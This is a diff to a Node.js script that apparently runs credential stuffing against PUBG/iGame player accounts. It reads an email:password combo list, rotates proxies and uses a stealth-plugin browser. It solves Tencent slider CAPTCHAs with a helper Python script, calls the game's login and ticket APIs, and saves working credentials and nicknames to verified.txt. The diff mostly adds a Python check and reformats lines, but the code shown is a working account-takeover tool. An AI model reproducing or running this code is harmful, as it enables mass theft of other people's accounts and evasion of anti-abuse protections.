@@ -7,12 +7,12 @@ const { randomBytes } = require('crypto');
 const { executablePath } = require('puppeteer')
 const fs = require('fs')
 const path = require('path');
-const { spawn } = require('child_process');
+const { spawn, spawnSync } = require('child_process');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth')
 
 puppeteer.use(StealthPlugin())
 
-
+let python = 'python3';
 const args = process.argv.slice(2);
 const BROWSER_COUNT = parseInt(args[1]) || 1;
 const PAGE_COUNT = parseInt(args[2]) || 1;
@@ -23,6 +23,22 @@ const user_agent_list = ["Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv"
 if (!args[0]) {
     console.log("Example usage: \nnode run.js accounts-filename BROWSER-COUNT PAGE-COUNT\nnode run.js combo_list.txt 2 10")
     process.exit(1);
+}
+
+checkPythonInstallationSync();
+
+function checkPythonInstallationSync() {
+    const python3Check = spawnSync('python3', ['--version']);
+    if (python3Check.status === 0) {
+        python = "python3";
+    } else {
+        const pythonCheck = spawnSync('python', ['--version']);
+        if (pythonCheck.status === 0) {
+            python = "python";
+        } else {
+            console.error(`Python not found: ${pythonCheck.stderr.toString().trim()}\ninstall python then run: \n\tpip install -r requirements.txt`);
+        }
+    }
 }
 
 const hash = (passwd) => {
@@ -48,7 +64,7 @@ async function sendRequestWithRetry(url, config, maxRetries = 5) {
     for (let attempt = 1; attempt <= maxRetries; attempt++) {
         try {
             const response = await axios(url, config);
-            return response; 
+            return response;
         } catch (error) {
             console.error(`Request error (Try ${attempt}):`, error.message);
             if (attempt === maxRetries) {
@@ -90,7 +106,7 @@ function readProxyList(filePath) {
 }
 
 const emailPasswordPairs = readAndProcessAccountList(args[0]);
-const proxies = readProxyList("./proxies.txt").map(p => {return {username: p[0], password: p[1], host: p[2], port: p[3]}});
+const proxies = readProxyList("./proxies.txt").map(p => { return { username: p[0], password: p[1], host: p[2], port: p[3] } });
 
 function getNextProxy() {
     const proxy = proxies.shift();
@@ -137,7 +153,7 @@ async function getBrowser(proxy) {
                 }, 100);
             }
         });
-        
+
         page.on('response', async response => {
             if (!page.credential) return;
             if (page.reloading || page.isClosed()) return;
@@ -151,8 +167,8 @@ async function getBrowser(proxy) {
                     page.reloadCaptcha();
                     return;
                 }
-                
-                const pythonProcess = spawn('python3', ['./crack_tencent_captcha.py', JSON.stringify(responseJson), `http://${page.proxy.username}:${page.proxy.password}@${page.proxy.host}:${page.proxy.port}`]);
+
+                const pythonProcess = spawn(python, ['./crack_tencent_captcha.py', JSON.stringify(responseJson), `http://${page.proxy.username}:${page.proxy.password}@${page.proxy.host}:${page.proxy.port}`]);
 
                 pythonProcess.stdout.once('data', async (data) => {
                     const dis = parseFloat(data);
@@ -163,16 +179,16 @@ async function getBrowser(proxy) {
                         frameElement = await page.waitForSelector('#tcaptcha_iframe_dy', { timeout: 10000 });
                         frame = await frameElement.contentFrame();
                         await frame.waitForSelector('.tc-slider-normal', { timeout: 10000 });
-                        
+
                         await frame.waitForTimeout(100);
                         await frame.evaluate((selector, offsetX, offsetY) => {
                             const element = document.querySelector(selector);
                             if (!element) {
                                 throw new Error(`Element ${selector} not found`);
                             }
-                            
+
                             offsetX += 10;
-                            
+
                             const createMouseEvent = (type, x, y) => {
                                 const event = new MouseEvent(type, {
                                     bubbles: true,
@@ -183,12 +199,12 @@ async function getBrowser(proxy) {
                                 });
                                 return event;
                             };
-                    
+
                             const rect = element.getBoundingClientRect();
                             const startX = rect.left + window.scrollX;
                             const startY = rect.top + window.scrollY;
-                    
-                            
+
+
                             element.dispatchEvent(createMouseEvent('mousedown', startX, startY));
                             element.dispatchEvent(createMouseEvent('mousemove', startX + offsetX, startY + offsetY));
                             element.dispatchEvent(createMouseEvent('mouseup', startX + offsetX, startY + offsetY));
@@ -198,7 +214,7 @@ async function getBrowser(proxy) {
                         page.reloadCaptcha();
                         return;
                     }
-                    
+
                 });
 
                 pythonProcess.stderr.on('data', (data) => {
@@ -209,16 +225,16 @@ async function getBrowser(proxy) {
             else if (responseUrl.includes("cap_union_new_verify")) {
                 let verifyData;
                 try {
-                    verifyData = await response.json(); 
+                    verifyData = await response.json();
                 } catch (error) {
-                    console.error("ERROR");
+                    console.error("CAPTCHA ERROR");
                     page.reloadCaptcha();
                     return;
                 }
                 // console.log(verifyData);
                 if (verifyData.ticket) {
-                    console.log("SUCCESS");
-                    const captchaToken = verifyData.ticket;  
+                    console.log("CAPTCHA SUCCESS");
+                    const captchaToken = verifyData.ticket;
                     const captchaRandstr = verifyData.randstr;
                     const mail = page.credential[0];
                     const password = page.credential[1];
@@ -233,7 +249,7 @@ async function getBrowser(proxy) {
                     const loginSig = hash(`/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1{"account":"${mail}","account_type":1,"area_code":"","extra_json":"","password":"${hashedPassword}","qcaptcha":{"ret": 0, "msg": "success", "randstr": "${captchaRandstr}", "ticket": "${captchaToken}"}}${secret_key}`);
                     const loginUrl = `https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1&sig=${loginSig}`;
                     const loginData = `{"account":"${mail}","account_type":1,"area_code":"","extra_json":"","password":"${hashedPassword}","qcaptcha":{"ret": 0, "msg": "success", "randstr": "${captchaRandstr}", "ticket": "${captchaToken}"}}`;
-                    const proxy = undefined; 
+                    const proxy = undefined;
                     // {
                     //     protocol: 'http',
                     //     host: page.proxy.host,
@@ -256,16 +272,16 @@ async function getBrowser(proxy) {
                         const gid = randomBytes(16).toString('hex');
                         const sValidKey = generateValidKey(`https://ig-us-sdkapi.igamecj.com/v1.0/user/login?did=${did}&dinfo=${dinfo}&iChannel=42&iGameId=1320&iPlatform=2&sGuestId=${gid}&sOriginalId=${gid}&sRefer=&token=${encodeURIComponent(loginToken)}&uid=${loginUid}`);
                         const login2Url = `https://ig-us-sdkapi.igamecj.com/v1.0/user/login?did=${did}&dinfo=${dinfo}&iChannel=42&iGameId=1320&iPlatform=2&sGuestId=${gid}&sOriginalId=${gid}&sRefer=&sValidKey=${sValidKey}&token=${encodeURIComponent(loginToken)}&uid=${loginUid}`;
-                        
-                        sendRequestWithRetry(login2Url, {headers, proxy}).then((login2Res) => {
+
+                        sendRequestWithRetry(login2Url, { headers, proxy }).then((login2Res) => {
                             if (login2Res.data.desc === "SUCCESS") {
                                 console.log("ACCOUNT FOUND", mail, password);
 
                                 let ticketUrl = `https://ig-us-sdkapi.igamecj.com/v1.0/user/getTicket?did=${did}&dinfo=${dinfo}&iChannel=42&iGameId=1320&iOpenid=${login2Res.data.iOpenid}&iPlatform=2&sGuestId=${gid}&sInnerToken=${login2Res.data.sInnerToken}&sOriginalId=${gid}&sRefer=`
                                 const sValidKey2 = generateValidKey(ticketUrl)
                                 ticketUrl = `${ticketUrl}&sValidKey=${sValidKey2}`
-                                sendRequestWithRetry(ticketUrl, {headers, proxy}).then((ticketRes) => {
-                                    sendRequestWithRetry("https://pubg-sg-community.playerinfinite.com/api/gpts.auth_svr.AuthSvr/LoginByItopTicket", { 
+                                sendRequestWithRetry(ticketUrl, { headers, proxy }).then((ticketRes) => {
+                                    sendRequestWithRetry("https://pubg-sg-community.playerinfinite.com/api/gpts.auth_svr.AuthSvr/LoginByItopTicket", {
                                         method: "post",
                                         data: {
                                             "partition": "3",
@@ -293,42 +309,42 @@ async function getBrowser(proxy) {
                                         fs.appendFile('verified.txt', `${mail}:${password}:${accountInfoRes.data.data.user_info.nick}\n`, (err) => {
                                             if (err) console.log(err);
                                         });
-                                        
+
                                         page.credential = null;
                                         page.reloadCaptcha();
                                     }).catch((error) => {
                                         fs.appendFile('verified.txt', `${mail}:${password}\n`, (err) => {
-                                            if (err) console.log(err); 
+                                            if (err) console.log(err);
                                         });
-                                        
+
                                         page.credential = null;
                                         page.reloadCaptcha();
                                     })
 
                                 }).catch((ticketError) => {
                                     fs.appendFile('verified.txt', `${mail}:${password}\n`, (err) => {
-                                        if (err) console.log(err); 
+                                        if (err) console.log(err);
                                     });
-                                    
+
                                     page.credential = null;
                                     page.reloadCaptcha();
                                 })
                             }
                             else {
-                                
+
                                 console.log("ACCOUNT NOT FOUND", page.credential);
                                 page.credential = null;
                                 page.reloadCaptcha();
                             }
                         }).catch((error) => {
-                            
+
                             page.credential = null;
                             page.reloadCaptcha();
                         });
-                    }).catch((error) => {});
+                    }).catch((error) => { });
                 }
                 else {
-                    console.error("ERROR", verifyData.errorCode);
+                    console.error("CAPTCHA ERROR", verifyData.errorCode);
                     page.reloadCaptcha();
                 }
             }
@@ -365,10 +381,10 @@ async function getBrowser(proxy) {
             }
             else if (request.url().includes(".com/tcaptcha-frame.28d99140.js")) {
                 request.respond({
-                        status: 200,
-                        contentType: 'application/javascript',
-                        body: fs.readFileSync("./tencent-captcha/tcaptcha-frame.28d99140.js", "utf8"),
-                    });
+                    status: 200,
+                    contentType: 'application/javascript',
+                    body: fs.readFileSync("./tencent-captcha/tcaptcha-frame.28d99140.js", "utf8"),
+                });
             }
             else if (request.url().includes("cap_union_new_getcapbysig?img_index=1")) {
                 request.respond({
@@ -404,7 +420,7 @@ async function getBrowser(proxy) {
                 page.reloading = false;
 
                 const credential = page.credential || getNextCredential();
-                
+
                 if (!credential && (await browser.pages()).filter(p => p.credential).length === 0) {
                     browser.close();
                 }
@@ -432,5 +448,5 @@ async function getBrowser(proxy) {
 })();
 
 
-process.on('uncaughtException', (e) =>  {console.log(e);})
-process.on('unhandledRejection', (e) => {console.log(e);})
+process.on('uncaughtException', (e) => { console.log(e); })
+process.on('unhandledRejection', (e) => { console.log(e); })
